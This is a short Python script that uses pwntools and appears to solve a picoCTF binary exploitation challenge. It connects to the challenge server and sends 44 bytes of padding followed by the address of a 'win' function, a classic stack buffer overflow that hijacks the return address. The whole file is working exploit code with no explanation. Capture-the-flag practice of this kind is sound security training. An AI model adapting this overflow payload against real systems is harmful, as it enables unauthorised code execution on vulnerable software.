from pwn import *

host = 'saturn.picoctf.net'
port = 59992
win_addres = 0x080491f6

r = remote(host,port)
r.recvuntil(b':')
message = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + p32(win_addres)
r.sendline(message)
res = r.recvall()
print(res)
